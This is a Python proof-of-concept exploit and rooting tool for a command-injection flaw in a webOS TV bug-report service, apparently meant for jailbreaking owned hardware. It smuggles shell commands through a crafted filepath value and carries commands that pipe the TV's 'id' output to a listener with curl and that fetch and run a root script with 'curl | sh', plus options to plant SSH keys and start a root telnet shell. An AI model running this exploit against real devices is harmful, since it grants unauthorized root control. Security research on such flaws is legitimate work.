#!/usr/bin/env python3
"""PoC and optional rooting flow for com.palm.service.bugreport/fileCrashReport.

Default mode proves command execution (`id` sent back to this machine).
--root mode serves root.sh, makes the TV fetch and run it as root, and follows
the Homebrew Channel install.

Use only on hardware you own.
"""

import argparse
import json
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlsplit

from webos_ssap import SSAPClient, SSAPError, WebSocket

HERE = Path(__file__).resolve().parent

PAGE = """<!doctype html>
<html><head><meta charset="utf-8"><title>bugreport PoC</title></head>
<body style="background:#111;color:#eee;font:22px sans-serif;padding:24px">
<pre id="out"></pre>
<script>
(function () {
    var UTC = __UTC__;
    var CMD = __CMD__;
    var out = document.getElementById('out');
    var keep = [];
    function log(m) {
        out.textContent += m + '\\n';
        var i = new Image(); keep.push(i);
        i.src = '/log?message=' + encodeURIComponent(m);
    }
    function call(label, uri, payload, next) {
        var B = typeof PalmServiceBridge === 'function' ? PalmServiceBridge : null;
        if (!B) { log(label + ': bridge unavailable'); return; }
        var b = new B(); keep.push(b);
        var replied = false;
        b.onservicecallback = function (r) {
            if (replied) return;
            replied = true;
            log(label + ': ' + r);
            if (next) next();
        };
        b.call(uri, JSON.stringify(payload));
    }
    function trigger() {
        var filepath = '/tmp; ' + CMD + '; #';
        call('fileCrashReport', 'luna://com.palm.service.bugreport/fileCrashReport',
             {filepath: filepath, filename: 'poc'}, null);
    }
    log('PalmServiceBridge: ' + typeof PalmServiceBridge);
    if (UTC) {
        call('autoClock', 'luna://com.webos.settingsservice/setSystemSettings',
             {category: 'time', settings: {autoClock: 'off'}}, function () {
            call('setSystemTime', 'luna://com.webos.service.systemservice/time/setSystemTime',
                 {utc: UTC}, trigger);
        });
    } else {
        trigger();
    }
    if (window.PalmSystem) window.PalmSystem.stageReady();
})();
</script></body></html>
"""


def log(message):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), message), flush=True)


def build_root_script(args):
    text = (HERE / "root.sh").read_text()
    keys = []
    for path in args.ssh_pubkey:
        keys.append('add_key "%s"' % Path(path).read_text().strip())
    text = text.replace("{{RESULT_URL}}", "http://%s:%d/result" % (args.local_ip, args.http_port))
    text = text.replace("{{HB_IPK_URL}}",
                        "http://%s:%d/hb.ipk" % (args.local_ip, args.http_port) if args.hb_ipk else "")
    text = text.replace("{{TELNET}}", "1" if args.telnet else "0")
    text = text.replace("{{SSH_KEYS}}", "\n".join(keys))
    return text.encode()


def main(argv=None):
    p = argparse.ArgumentParser()
    p.add_argument("--tv", required=True)
    p.add_argument("--local-ip", required=True)
    p.add_argument("--http-port", type=int, default=8080)
    p.add_argument("--utc", type=int, default=0,
                   help="epoch seconds to set (build date + a few days); 0 skips the clock step")
    p.add_argument("--cmd", default="",
                   help="custom command to inject; default sends id back to this machine")
    p.add_argument("--root", action="store_true",
                   help="serve root.sh and make the TV run it as root")
    p.add_argument("--hb-ipk", default="", help="Homebrew Channel IPK to serve")
    p.add_argument("--ssh-pubkey", action="append", default=[],
                   help="public key file installed in /home/root/.ssh/authorized_keys")
    p.add_argument("--telnet", action="store_true", help="start a root telnetd on 2323")
    p.add_argument("--key-file", default=str(HERE / "client.key"))
    p.add_argument("--timeout", type=float, default=0)
    args = p.parse_args(argv)

    if args.root:
        command = args.cmd or ("curl -s %s:%d/root.sh|sh" % (args.local_ip, args.http_port))
        root_script = build_root_script(args)
        if not args.timeout:
            args.timeout = 90.0
    else:
        command = args.cmd or ("id | curl -s -d@- %s:%d/result" % (args.local_ip, args.http_port))
        root_script = b""
        if not args.timeout:
            args.timeout = 25.0

    page = (PAGE.replace("__UTC__", str(args.utc))
                .replace("__CMD__", json.dumps(command)).encode())
    done = threading.Event()
    results = []

    log("mode: %s" % ("root" if args.root else "proof"))
    log("injected command: %s" % command)
    log("filepath: /tmp; %s; #" % command)

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            parsed = urlsplit(self.path)
            if parsed.path == "/log":
                msg = parse_qs(parsed.query).get("message", [""])[0][:4000]
                log("TV: " + msg)
                self.send_response(204)
                self.end_headers()
                return
            if parsed.path == "/root.sh" and root_script:
                self._send(200, root_script, "text/plain")
                return
            if parsed.path == "/hb.ipk" and args.hb_ipk:
                self._send(200, Path(args.hb_ipk).read_bytes(), "application/octet-stream")
                return
            if parsed.path != "/page":
                self.send_error(404)
                return
            self._send(200, page, "text/html; charset=utf-8")

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode(errors="replace")
            log("RESULT: " + body.strip())
            results.append(body)
            if "ROOT_DONE" in body or not args.root:
                done.set()
            self.send_response(204)
            self.end_headers()

        def _send(self, code, body, content_type):
            self.send_response(code)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    server = ThreadingHTTPServer((args.local_ip, args.http_port), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    client = None
    try:
        client = SSAPClient(WebSocket.connect(args.tv, 3001, secure=True))
        key_path = Path(args.key_file)
        key = key_path.read_text().strip() if key_path.exists() else ""
        manifest = {
            "manifestVersion": 1, "appVersion": "1.0", "appId": "org.local.bugreportpoc",
            "vendorId": "webos-4x-bugreport-rce", "localizedAppNames": {"": "Bugreport PoC"},
            "localizedVendorNames": {"": "webos-4x-bugreport-rce"},
            "permissions": ["LAUNCH", "CLOSE", "READ_APP_STATUS",
                            "READ_INSTALLED_APPS", "READ_RUNNING_APPS", "LAUNCH_WEBAPP"],
        }
        new_key = client.register(key, manifest, timeout=90.0, log=log)
        if new_key and new_key != key:
            key_path.write_text(new_key)
            key_path.chmod(0o600)

        response = client.request("ssap://webapp/launchWebApp", {
            "webAppId": "bugreportpoc" + str(int(time.time())),
            "webAppUrl": "http://%s:%d/page" % (args.local_ip, args.http_port),
            "noLoadingSplash": True,
            "appInfo": {"title": "Bugreport PoC", "type": "web", "trustLevel": "default"},
        })
        log("launch: " + json.dumps(response))
        launched = (response.get("payload") or {}).get("id")
        session = (response.get("payload") or {}).get("sessionId")
        done.wait(args.timeout)
        time.sleep(1)
        if launched:
            close = {"webAppId": launched, "id": launched}
            if session:
                close["sessionId"] = session
            try:
                client.request("ssap://webapp/closeWebApp", close)
            except SSAPError as error:
                log("close failed: %s" % error)
    except SSAPError as error:
        log("error: %s" % error)
    finally:
        if client is not None:
            client.close()
        server.shutdown()
        server.server_close()

    if not results:
        log("no result received")
        return 1
    joined = "\n".join(results)
    if args.root:
        log("root flow finished; check ROOT_DONE and hb config above")
        return 0 if "ROOT_DONE" in joined else 1
    log("root confirmed" if "uid=0" in joined else "command executed, check output")
    return 0


if __name__ == "__main__":
    sys.exit(main())
